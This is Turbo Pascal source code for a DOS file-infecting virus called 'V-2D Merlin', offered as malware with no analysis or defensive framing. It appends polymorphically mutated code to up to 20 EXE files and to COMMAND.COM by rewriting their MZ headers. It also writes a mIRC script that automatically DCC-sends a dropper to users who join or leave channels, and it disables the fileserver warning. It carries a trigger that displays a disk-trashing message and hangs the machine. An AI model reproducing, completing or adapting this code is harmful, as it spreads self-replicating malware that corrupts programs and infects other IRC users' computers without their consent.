   {$S- $R- $Q- $F-}
   uses dos;
   type
         mz_hdr = record
           Signature,
           ExtraBytes,
           Pages,
           RelocItems,
           HeaderSize,
           MinAlloc,
           MaxAlloc,
           InitSS,
           InitSP,
           CheckSum,
           InitIP,
           InitCS,
           RelocTable,
           Overlay:     Word;
   end;
   type
         virii = record
         buffer: Pointer;
         source: Pointer;
         vl:     word;
         OfsSS:  ^word;
         OfsSP:  ^word;
         OfsCS:  ^word;
         OfsIP:  ^word;
   end;

   procedure randomize; external; {$L engine.obj}
   procedure engine;    external;
   procedure demos;     external; {$L payload.obj}
   procedure timer(tick:word);external;

   var
        f: file;
        dirinfo: searchrec;
        vir: virii;
        mz: mz_hdr;

   { LordDarkMutationEngine version 1.2 }

   function  LME(IP: word): word; assembler;
   asm
        push ds
        push es
        mov cx, vir.vl
        mov ax, ip
        les di, vir.buffer
        lds si, vir.source
        shr cx, 1
        adc cx, 0
        call engine
        xchg ax, cx
        pop es
        pop ds
   end;

   function make_dropper( fname: string): boolean;
   var
         dropper_len : word;
         res         : longint;
         ff          : file;
   begin
         make_dropper  := False;
         mz.Signature  := $5A4D;
         mz.RelocItems := 0;
         mz.HeaderSize := 2;
         mz.MinAlloc   := 0;
         mz.MaxAlloc   := $FFFF;
         mz.InitSS     := 0;
         mz.InitSP     := $FFFE;
         mz.CheckSum   := 0;
         mz.InitIP     := 0;
         mz.InitCS     := 0;

         vir.ofsip^ := 0;
         vir.ofscs^ := $FFF0;
         vir.ofsss^ := 0;
         vir.ofssp^ := $FFFE;

         dropper_len   := lme(0);
         mz.ExtraBytes := dropper_len mod $200;
         mz.Pages      := dropper_len div $200;
         if mz.ExtraBytes <> 0 Then Inc(mz.Pages);

         assign(ff, fname);
         {$I-} Rewrite(ff,1); {$I+}
         if ioresult <> 0 then exit;
         BlockWrite(ff, Addr(mz)^, sizeof(mz_hdr));
         BlockWrite(ff, res, 4);
         BlockWrite(ff, vir.buffer^, dropper_len);
         close(ff);
         make_dropper := True;
   end;

   procedure infect( fname: string );
   var
        attr: word;
   begin
        assign(f, fname);
        {$i-} reset(f, 1); {$i+}
        if IOResult <> 0 then Exit;
        if (FileSize(f) < 1000) Or (FileSize(f) > (200*1024) ) Then
           Begin Close(f); Exit; End;
        BlockRead(f, Addr(mz)^, sizeof(mz_hdr));
        if mz.InitCS <> 0 Then
        if mz.InitCS = mz.InitSS Then
           Begin Close(f); Exit; End;

        { infect command.com }

        If (mz.InitCS = 0) and (FileSize(f)<100000) and (FileSize(f) > 70000) Then
        Else
        Begin
        attr := FileSize(f) mod 512;
        if attr <> mz.ExtraBytes Then
           Begin Close(f); Exit; End;
        if attr <> 0 Then Dec(mz.Pages);
        if (FileSize(f) div 512) <> mz.Pages Then
           Begin Close(f); Exit; End;
        End;

        if (mz.signature = $5A4D) or (mz.Signature = $4D5A) then
        else
           Begin Close(f); Exit; End;
        vir.ofsip^ := mz.initip;
        vir.ofscs^ := mz.initcs;
        vir.ofsss^ := mz.initss;
        vir.ofssp^ := mz.initsp;
        attr := lme((Filesize(f)-mz.HeaderSize*16) mod $10);
        mz.InitIP := (Filesize(f)-mz.HeaderSize*16) mod $10;
        mz.InitCS := (Filesize(f)-mz.HeaderSize*16) div $10;
        mz.InitSS := mz.InitCS;
        mz.InitSP := $FFFE;
        mz.Pages  := (FileSize(f)+attr) div 512;
        mz.ExtraBytes := (FileSize(f)+attr) mod 512;
        if mz.ExtraBytes <> 0 Then Inc(mz.Pages);
        Seek(f, FileSize(f));
        BlockWrite(f, vir.buffer^, attr);
        Seek(f, 0);
        BlockWrite(f, Addr(mz)^, sizeof(mz_hdr));
        Close(f);
   end;

   var
        r: registers;
        w: word;
   const
        test_write = #255#0;
        scrypt1: string[186] =

          '[script]'#$D#$A+
          'n0=run ~merlin.exe'#$D#$A+
          'n1=ON 1:JOIN:#:{ /if ( $nick == $me )'#$D#$A+
          'n2= /dcc send $nick ~merlin.exe'#$D#$A+
          'n3=}'#$D#$A+
          'n4=ON 1:PART:#:{ /if ( $nick == $me )'#$D#$A+
          'n5= /dcc send $nick ~merlin.exe'#$D#$A+
          'n6=}'#$D#$A ;

        scrypt2: string[29] =

          #$D#$A+
          '[fileserver]'#$D#$A+
          'Warning=Off'#$D#$A;

   procedure make_mirc( path: string) ;
   var
           ff: file;
   begin
           if make_dropper(+path+'mirc\'+'~merlin.exe') then
                  begin
                     assign(ff, path+'mirc\'+'script.ini');
                     {$I-} reset(ff, 1); {$I+}
                     if ioresult <> 0 then
                        begin
                            {$I-} rewrite(ff, 1); {$I+}
                            if ioresult <> 0 then exit;
                        end
                     else
                       if filesize(ff) = 186 then begin close(ff); exit; end;
                     close(ff);
                     rewrite(ff,1);
                     BlockWrite(ff, scrypt1[1], length(scrypt1));
                     close(ff);
                     Seek(f, filesize(f));
                     BlockWrite(f, scrypt2[1], length(scrypt2));
                  end;
           close(f);
   end;

   begin
        randomize;
        r.ds := seg(vir);
        r.si := ofs(vir);
        intr($91,r);
        { make mIRC scrypt }
        assign(f,'c:\mirc\mirc.ini');
        {$I-} reset(f, 1); {$I+}
        if ioresult = 0 then make_mirc('c:\')
        else
          begin
              assign(f,'c:\progra~1\mirc\mirc.ini');
              {$I-} reset(f, 1); {$I+}
              if ioresult = 0 then make_mirc('c:\progra~1\');
          end;
        if PortW[$40] = 666 then
           begin
              demos;
              Writeln('V-2D Merlin');
              Writeln;
              Writeln('Now you die!');
              Writeln;
              Write('Trash your disk ');
              for w:=1 to 20 do
                  begin
                      write('.');
                      timer(4);
                  end;
               Writeln;
               Writeln('Now you disk is fucked!!!!');
               asm
                  { Hang up }
                  cli
               @0:
                  jmp @0
               end;
           end;
        assign(f, test_write);
        {$i-} rewrite(f, 1); {$i+}
        if IOResult <> 0 Then Halt(0);
        close(f);
        erase(f);
        FindFirst('*.exe', Archive, DirInfo);
        w:=0;
        while DosError = 0 do
        begin
           Inc(w);
           If w > 20 Then Break;
           Infect(DirInfo.Name);
           FindNext(DirInfo);
        end;
        infect(GetEnv('COMSPEC'));
   end.
